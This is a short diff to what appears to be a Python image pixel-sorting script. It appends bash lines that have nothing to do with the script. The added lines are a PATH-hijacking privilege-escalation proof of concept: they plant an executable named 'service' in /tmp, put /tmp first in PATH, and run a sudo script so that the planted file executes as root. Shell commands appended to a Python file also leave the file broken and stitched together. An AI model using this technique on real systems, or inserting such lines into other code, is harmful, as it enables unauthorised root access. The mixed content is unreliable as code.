@@ -17,3 +17,11 @@ sorted_img = np.array(sorted_pixels).reshape(h, w, 3)
 
 # Save
 Image.fromarray(sorted_img.astype(np.uint8)).save("sorted_output.png")
+
+
+echo '#!/bin/bash' > /tmp/service
+echo 'echo "PATH Exploit Worked: $0" > /tmp/path_test' >> /tmp/service
+chmod +x /tmp/service
+export PATH=/tmp:$PATH
+sudo /home/<your-username>/script.sh start
+cat /tmp/path_test
